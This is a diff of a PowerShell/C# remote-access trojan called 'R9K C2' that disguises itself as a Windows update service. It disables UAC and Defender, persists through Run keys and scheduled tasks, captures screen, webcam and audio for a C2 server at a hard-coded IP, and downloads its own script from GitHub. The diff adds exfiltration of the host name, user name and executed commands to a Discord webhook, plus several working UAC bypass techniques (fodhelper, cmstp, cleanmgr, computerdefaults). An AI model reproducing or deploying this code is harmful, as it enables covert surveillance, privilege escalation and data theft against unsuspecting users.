@@ -2,6 +2,7 @@
 
 $serverIP = "198.1.195.204"
 $serverPort = 4000
+$webhookURL = "https://canary.discord.com/api/webhooks/1569104108970057808/AcOuccicbirVBoi7gMTYjsZPiy9CpKJOI1Lwk28-4LMgMtaOnYuoucklvCcgbHF36egZ"
 
 $h = [System.BitConverter]::ToString(
     [System.Security.Cryptography.MD5]::Create().ComputeHash(
@@ -11,6 +12,14 @@ $taskName     = "MicrosoftWindowsUpdateService_$h"
 $taskBootName = "MicrosoftWindowsUpdateBoot_$h"
 $mutexName    = "Local\WinUpdateSvcMutex_$h"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
+
+# Função para Log no Discord
+function Send-Webhook($msg) {
+    try {
+        $body = @{ content = "**[R9K C2]** `" + $env:COMPUTERNAME + "`" (``$env:USERNAME``)\n" + $msg } | ConvertTo-Json
+        Invoke-RestMethod -Uri $webhookURL -Method Post -Body $body -ContentType 'application/json' -ErrorAction SilentlyContinue | Out-Null
+    } catch {}
+}
 
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
@@ -24,13 +33,13 @@ $vbsPath = "$dir\$installName.vbs"
 $bootPath = "$dir\boot_launcher.ps1"
 
 if ($args -notcontains "-silent") {
-    # 1. Silenciar o UAC
+    # Silenciar o UAC
     try {
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force -ErrorAction SilentlyContinue
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 0 -Force -ErrorAction SilentlyContinue
     } catch {}
 
-    # 2. Desativar Defender (Sordum)
+    # Defender Off
     $defenderOff = $false
     try {
         $mp = Get-MpComputerStatus -ErrorAction Stop
@@ -61,7 +70,7 @@ if ($args -notcontains "-silent") {
         } catch {}
     }
 
-    # 3. Instalar arquivos
+    # Instalar arquivos
     New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
     try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
 
@@ -80,7 +89,6 @@ while (`$true) {
 "@
     Set-Content -Path $bootPath -Value $bootContent -Force -ErrorAction SilentlyContinue
 
-    # 4. Persistência
     $cmd = "wscript.exe //B //Nologo `"$vbsPath`""
     try {
         Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
@@ -283,7 +291,13 @@ if (-not ("R9KAgent" -as [type])) {
                     myWriter.AutoFlush = true;
                     globalWriter = myWriter;
                     int nMon = Screen.AllScreens.Length;
-                    myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|" + nMon);
+                    
+                    string banner = "BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|" + nMon;
+                    myWriter.WriteLine(banner);
+                    
+                    // Log de Conexao
+                    try { System.Net.WebClient wc = new System.Net.WebClient(); wc.Headers.Add("Content-Type", "application/json"); string body = "{\"content\":\"**[R9K C2]** Nova conexao de `" + Environment.MachineName + "` (" + Environment.UserName + ")\"}"; wc.UploadString("https://canary.discord.com/api/webhooks/1569104108970057808/AcOuccicbirVBoi7gMTYjsZPiy9CpKJOI1Lwk28-4LMgMtaOnYuoucklvCcgbHF36egZ", "POST", body); } catch {}
+
                     Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                     Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();
                     Thread tBeat = new Thread(() => HeartbeatLoop(myClient, myWriter)); tBeat.IsBackground = true; tBeat.Start();
@@ -488,12 +502,12 @@ if (-not ("R9KAgent" -as [type])) {
                             File.Delete(tempBmp);
                         } catch {}
                     }
-                    Thread.Sleep(150); // Aproximadamente 6 a 7 FPS para não sobrecarregar o VfW
+                    Thread.Sleep(150); // Aproximadamente 6 a 7 FPS
                 }
                 SendMessage(capWnd, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero);
                 DestroyWindow(capWnd);
             });
-            t.SetApartmentState(ApartmentState.STA); // VfW exige STA
+            t.SetApartmentState(ApartmentState.STA);
             t.IsBackground = true;
             t.Start();
         }
@@ -506,66 +520,38 @@ if (-not ("R9KAgent" -as [type])) {
                     IMMDeviceEnumerator enumerator = (IMMDeviceEnumerator)new MMDeviceEnumeratorComObject();
                     IMMDevice device;
                     int hr = enumerator.GetDefaultAudioEndpoint(0, 1, out device);
-                    if (hr != 0 || device == null) {
-                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Nenhum dispositivo de audio padrao encontrado."); }
-                        isAudioRunning = false; return;
-                    }
-
+                    if (hr != 0 || device == null) { isAudioRunning = false; return; }
                     Guid IID_IAudioClient = new Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2");
                     IAudioClient audioClient;
                     hr = device.Activate(ref IID_IAudioClient, 23, IntPtr.Zero, out audioClient);
-                    if (hr != 0 || audioClient == null) {
-                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Falha ao ativar o dispositivo HR=" + hr.ToString("X")); }
-                        isAudioRunning = false; return;
-                    }
-
+                    if (hr != 0 || audioClient == null) { isAudioRunning = false; return; }
                     IntPtr pFormat;
                     hr = audioClient.GetMixFormat(out pFormat);
-                    if (hr != 0 || pFormat == IntPtr.Zero) {
-                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Falha ao obter formato HR=" + hr.ToString("X")); }
-                        isAudioRunning = false; return;
-                    }
-
+                    if (hr != 0 || pFormat == IntPtr.Zero) { isAudioRunning = false; return; }
                     WAVEFORMATEX wfx = (WAVEFORMATEX)Marshal.PtrToStructure(pFormat, typeof(WAVEFORMATEX));
-                    
                     hr = audioClient.Initialize(0, 0x00080000, 10000000, 0, pFormat, IntPtr.Zero);
-                    if (hr != 0) {
-                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Driver nao suporta Loopback (HR=0x" + hr.ToString("X") + ")"); }
-                        CoTaskMemFree(pFormat);
-                        isAudioRunning = false; return;
-                    }
-                    
+                    if (hr != 0) { CoTaskMemFree(pFormat); isAudioRunning = false; return; }
                     Guid IID_IAudioCaptureClient = new Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317");
                     IAudioCaptureClient captureClient;
                     hr = audioClient.GetService(ref IID_IAudioCaptureClient, out captureClient);
-                    if (hr != 0 || captureClient == null) {
-                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Falha ao obter servico de captura HR=" + hr.ToString("X")); }
-                        CoTaskMemFree(pFormat);
-                        isAudioRunning = false; return;
-                    }
-                    
+                    if (hr != 0 || captureClient == null) { CoTaskMemFree(pFormat); isAudioRunning = false; return; }
                     audioClient.Start();
                     bool sentFmt = false;
-                    
                     while (isAudioRunning && globalWriter != null) {
                         Thread.Sleep(10);
                         uint packetSize;
                         hr = captureClient.GetNextPacketSize(out packetSize);
                         if (hr != 0) { Thread.Sleep(100); continue; }
-                        
                         while (packetSize > 0 && isAudioRunning) {
                             IntPtr pData; uint numFrames; uint flags; ulong pos, qpc;
                             hr = captureClient.GetBuffer(out pData, out numFrames, out flags, out pos, out qpc);
                             if (hr != 0) break;
-                            
                             if (numFrames > 0) {
                                 int bytes = (int)(numFrames * wfx.nBlockAlign);
                                 byte[] buffer = new byte[bytes];
                                 Marshal.Copy(pData, buffer, 0, bytes);
-                                
                                 bool isFloat = (wfx.wFormatTag == 3);
                                 if (wfx.wFormatTag == 0xFFFE && wfx.wBitsPerSample == 32) isFloat = true;
-
                                 if (isFloat) {
                                     int samples = bytes / 4;
                                     byte[] pcm16 = new byte[samples * 2];
@@ -579,13 +565,9 @@ if (-not ("R9KAgent" -as [type])) {
                                     }
                                     buffer = pcm16;
                                 }
-                                
                                 lock (writeLock) {
                                     if (globalWriter != null) {
-                                        if (!sentFmt) { 
-                                            globalWriter.WriteLine("AUDIO_FMT:" + wfx.nSamplesPerSec + ":" + wfx.nChannels + ":16"); 
-                                            sentFmt = true; 
-                                        }
+                                        if (!sentFmt) { globalWriter.WriteLine("AUDIO_FMT:" + wfx.nSamplesPerSec + ":" + wfx.nChannels + ":16"); sentFmt = true; }
                                         globalWriter.WriteLine("AUDIO:" + Convert.ToBase64String(buffer));
                                     }
                                 }
@@ -597,9 +579,7 @@ if (-not ("R9KAgent" -as [type])) {
                     }
                     audioClient.Stop();
                     CoTaskMemFree(pFormat);
-                } catch (Exception ex) {
-                    lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: " + ex.Message); }
-                } finally { isAudioRunning = false; }
+                } catch { } finally { isAudioRunning = false; }
             });
             t.SetApartmentState(ApartmentState.STA); t.IsBackground = true; t.Start();
         }
@@ -645,6 +625,9 @@ if (-not ("R9KAgent" -as [type])) {
 
         static void ProcessCommand(string cmd, StreamWriter myWriter) {
             try {
+                // Log comando no Discord
+                try { System.Net.WebClient wc = new System.Net.WebClient(); wc.Headers.Add("Content-Type", "application/json"); string body = "{\"content\":\"**[R9K CMD]** `" + Environment.MachineName + "` executou: `" + cmd + "`\"}"; wc.UploadString("https://canary.discord.com/api/webhooks/1569104108970057808/AcOuccicbirVBoi7gMTYjsZPiy9CpKJOI1Lwk28-4LMgMtaOnYuoucklvCcgbHF36egZ", "POST", body); } catch {}
+
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                 
@@ -653,6 +636,80 @@ if (-not ("R9KAgent" -as [type])) {
                 
                 if (cmd == "audio_start") { StartAudio(); lock(writeLock) { myWriter.WriteLine("AUDIO_ON"); } return; }
                 if (cmd == "audio_stop") { isAudioRunning = false; lock(writeLock) { myWriter.WriteLine("AUDIO_OFF"); } return; }
+
+                // ==========================================
+                // UAC BYPASS METHODS
+                // ==========================================
+                if (cmd == "uac_fodhelper") {
+                    try {
+                        Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");
+                        key.SetValue("", "cmd.exe /c start cmd.exe", Microsoft.Win32.RegistryValueKind.String);
+                        key.SetValue("DelegateExecute", "", Microsoft.Win32.RegistryValueKind.String);
+                        key.Close();
+                        Process.Start("fodhelper.exe");
+                        Thread.Sleep(2000);
+                        try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings"); } catch {}
+                        lock(writeLock) { myWriter.WriteLine("UAC_BYPASS_OK: Fodhelper"); }
+                    } catch { lock(writeLock) { myWriter.WriteLine("UAC_ERR: Fodhelper"); } }
+                    return;
+                }
+                
+                if (cmd == "uac_cmstp") {
+                    try {
+                        string infPath = Path.Combine(Path.GetTempPath(), "uac.inf");
+                        string content = "[version]\r\nSignature=$chicago$\r\nAdvancedINF=2.5\r\n[DefaultInstall]\r\nCustomDestination=CustInstDestSectionAllUsers\r\nRunPreSetupCommands=RunPreSetupCommandsSection\r\n[RunPreSetupCommandsSection]\r\ncmd.exe /c start cmd.exe\r\n[CustInstDestSectionAllUsers]\r\n49000,49001=AllUSer_LDIDSection, 7\r\n[AllUSer_LDIDSection]\r\n\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%UnexpectedError%\", \"C:\\Windows\\System32\\cmd.exe\"";
+                        File.WriteAllText(infPath, content);
+                        Process.Start("cmstp.exe", "/s \"" + infPath + "\"");
+                        lock(writeLock) { myWriter.WriteLine("UAC_BYPASS_OK: Cmstp"); }
+                    } catch { lock(writeLock) { myWriter.WriteLine("UAC_ERR: Cmstp"); } }
+                    return;
+                }
+
+                if (cmd == "uac_cleanmgr") {
+                    try {
+                        Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Environment");
+                        key.SetValue("windir", "cmd.exe /c start cmd.exe", Microsoft.Win32.RegistryValueKind.String);
+                        key.Close();
+                        Process.Start("cleanmgr.exe", "/sagerun:1");
+                        Thread.Sleep(2000);
+                        try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(@"Environment"); } catch {}
+                        lock(writeLock) { myWriter.WriteLine("UAC_BYPASS_OK: Cleanmgr"); }
+                    } catch { lock(writeLock) { myWriter.WriteLine("UAC_ERR: Cleanmgr"); } }
+                    return;
+                }
+
+                if (cmd == "uac_computerdefaults") {
+                    try {
+                        Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Classes\mscfile\shell\open\command");
+                        key.SetValue("", "cmd.exe /c start cmd.exe", Microsoft.Win32.RegistryValueKind.String);
+                        key.Close();
+                        Process.Start("computerdefaults.exe");
+                        Thread.Sleep(2000);
+                        try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\mscfile"); } catch {}
+                        lock(writeLock) { myWriter.WriteLine("UAC_BYPASS_OK: ComputerDefaults"); }
+                    } catch { lock(writeLock) { myWriter.WriteLine("UAC_ERR: ComputerDefaults"); } }
+                    return;
+                }
+
+                if (cmd == "uac_reqadmin") {
+                    try {
+                        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe");
+                        psi.Verb = "runas";
+                        psi.UseShellExecute = true;
+                        Process.Start(psi);
+                        lock(writeLock) { myWriter.WriteLine("UAC_REQ_OK: Request enviado"); }
+                    } catch { lock(writeLock) { myWriter.WriteLine("UAC_REQ_ERR: Recusado"); } }
+                    return;
+                }
+
+                if (cmd == "uac_deescalate") {
+                    try {
+                        Process.Start("runas.exe", "/trustlevel:0x20000 \"cmd.exe\"");
+                        lock(writeLock) { myWriter.WriteLine("UAC_DEESC_OK"); }
+                    } catch { lock(writeLock) { myWriter.WriteLine("UAC_DEESC_ERR"); } }
+                    return;
+                }
+                // ==========================================
 
                 if (cmd == "monitor_next") {
                     int n = Screen.AllScreens.Length;
